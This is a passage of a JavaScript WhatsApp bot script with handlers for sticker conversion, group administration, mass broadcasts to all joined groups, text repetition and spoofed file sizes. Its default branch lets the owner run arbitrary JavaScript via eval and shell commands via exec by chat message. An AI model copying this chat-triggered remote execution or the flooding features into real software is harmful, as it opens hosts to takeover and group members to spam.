            conn.sendMessage(m.chat, { image: buffer }, { quoted: fkontak })      
fs.unlinkSync(name)
        })
        
} else return paycall(`Please reply to non animated sticker`)
    }
    break
case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            reply(global.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            reply(global.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${conn.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            reply(global.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return paycall('Reply video')
                if (!/webp/.test(mime)) return paycall(`reply sticker with caption *${prefix + command}*`)
                reply(global.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'swm': case 'take':
         case 'wm': {
            if (!quoted) return paycall(`Where is the text?`)
            if (quoted.isAnimated) {
               let media = await conn.downloadAndSaveMediaMessage(quoted)
               let webpToMp4 = await webp2mp4File(media)
               let encmedia = await conn.sendVideoAsSticker(m.chat, webpToMp4.result, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return paycall('Maximum 10 Seconds!')
               let media = await quoted.download()
               let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else {
               paycall(`Photo/Video?`)
            }
            }
         break
         case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return paycall(respond)
                if (!text) return paycall(respond)
                reply(global.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await conn.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans}`
                let pop = await conn.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
            case 'qc': {
                const {
                    quote
                } = require('./lib/quote.js')
                if (!q) return paycall('Enter Text')
                let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
                const rest = await quote(q, pushname, ppnyauser)
                reply(global.wait)
                conn.sendImageAsSticker(m.chat, rest.result, m, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
            }
            break
//END STICKER
case 'tes':
         case 'runtime':
            paycall(`Runtime : ${runtime(process.uptime())}`)
            break
//GROUP MENU
case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
let response = await conn.groupInviteCode(from)
conn.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
conn.groupRevokeInvite(from)
break

case 'sendlinkgc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await conn.groupInviteCode(from)
conn.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break

case 'kick': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'add': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'hidetag': case 'hid':
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
conn.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)
})
break
case 'totag':
                if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
                conn.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break

case 'editgroup': {   
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break

case 'editinfo': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
 if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break

case 'join': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editsubjek': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text nya ?'
await loading()
await conn.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editdesk':{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
await loading()
await conn.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'tagall': {
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break

case'demoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'demote')
break

case 'promoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'promote')
break

case "welcome":
{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
conn.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'antilink': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case "antitoxic":
{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break

case 'tourl': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')

if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}

break
case 'toonce':
            case 'nyehh': {
            if (!isCreator) return paycall(global.ownercuy)
                if (!quoted) return replygcxeon(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                    } else if (/audio/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        audio: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "19",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                    } else if (/document/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break

case 'block': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'unblock': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//END GROUP MENU

//========================REPEAT WHATSAPP=========================//
case 'repeat':
if (!isCreator) return paycall(global.ownercuy)
if (!text) return paycall('Masukan Text|jumlah')
reply(global.wait)
var shinchan_kawaii = `${args.join(' ')}`
var kata = shinchan_kawaii.split("|")[0];
var angka = shinchan_kawaii.split("|")[1]
let katanya = `${kata}`.repeat(angka)
await conn.sendMessage(m.chat, { text: `${katanya}` }, { quoted: fkontak})
break
case 'getcase':
if (!isCreator) return paycall(global.ownercuy)
const getCase = (cases) => {
return "case" + `'${cases}'` + fs.readFileSync("main.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
}
reply(`${getCase(q)}`)
break
//END REPEAT


default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('< ')) {
if (!isCreator) return m.reply(`*khusus Owner*`)
               try {
                  return reply(JSON.stringify(eval(`${args.join(' ')}`), null, '\t'))
               } catch (e) {
                  reply(util.format(e))
               }
            }
if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(`*khusus Owner*`)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }

if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
conn.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
